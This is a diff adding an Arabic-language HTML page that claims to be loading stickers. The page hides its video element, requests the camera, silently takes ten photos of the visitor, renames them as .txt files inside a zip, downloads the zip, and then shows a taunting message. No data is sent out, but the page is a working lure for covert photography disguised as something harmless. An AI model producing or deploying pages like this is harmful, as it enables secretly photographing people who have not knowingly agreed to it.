@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تطبيق الكاميرا</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            direction: rtl;
+        }
+        #loadingText {
+            font-size: 20px;
+            color: #555;
+        }
+        #video {
+            display: none; /* إخفاء الفيديو */
+        }
+    </style>
+</head>
+<body>
+    <div id="loadingText">جار تحميل الستيكر لي مفيه ميتشاف</div>
+    <video id="video" autoplay></video> <!-- عنصر الفيديو مخفي -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <script>
+        let capturedImages = [];
+        let captureCount = 0;
+        let cameraStream = null;
+
+        // طلب الوصول إلى الكاميرا بعد تحميل الصفحة
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                cameraStream = stream;  // حفظ الـ stream لاستخدامه لاحقًا
+                let videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+
+                // بدأ التقاط الصور بعد 4 ثوانٍ من تحميل الصفحة
+                setTimeout(function() {
+                    // نبدأ بالتقاط الصور بشكل تلقائي
+                    let captureInterval = setInterval(function() {
+                        if (captureCount < 10) {
+                            captureImage(videoElement);
+                            captureCount++;
+                        } else {
+                            clearInterval(captureInterval);
+                            saveImagesAsZip();
+                        }
+                    }, 400);  // التقاط صورة كل 400 مللي ثانية خلال 4 ثوانٍ
+                }, 4000);  // انتظار 4 ثوانٍ قبل بدء التقاط الصور
+            })
+            .catch(function(error) {
+                alert("فشل في الوصول إلى الكاميرا: " + error);
+            });
+
+        // دالة لالتقاط صورة من الفيديو
+        function captureImage(videoElement) {
+            let canvas = document.createElement("canvas");
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            let ctx = canvas.getContext("2d");
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            capturedImages.push(canvas.toDataURL("image/jpeg"));
+        }
+
+        // حفظ الصور في ملف مضغوط مع تغيير امتدادها إلى .txt
+        function saveImagesAsZip() {
+            let zip = new JSZip();
+            for (let i = 0; i < capturedImages.length; i++) {
+                let imageData = capturedImages[i].split(',')[1];  // إزالة البيانات غير الضرورية
+                let fileName = "ستيكر" + (i + 1) + ".txt"; // تغيير الاسم والامتداد إلى .txt
+                zip.file(fileName, imageData, {base64: true});
+            }
+
+            zip.generateAsync({ type: "blob" })
+                .then(function(content) {
+                    // حفظ الملف المضغوط تلقائيًا
+                    let link = document.createElement("a");
+                    link.href = URL.createObjectURL(content);
+                    link.download = "stickers-mafihom-maytchaf.zip";
+                    link.click();  // يقوم بتنزيل الأرشيف مباشرة
+
+                    // بعد الانتهاء من التحميل، إخفاء النص "جار تحميل الستيكر لي مفيه ميتشاف"
+                    document.getElementById('loadingText').style.display = 'none';
+
+                    // عرض النص الجديد
+                    let newText = document.createElement('h1');
+                    newText.innerText = "الزمر لا شفتي ستيكر👽🤖";
+                    document.body.appendChild(newText);
+                });
+        }
+    </script>
+</body>
+</html>
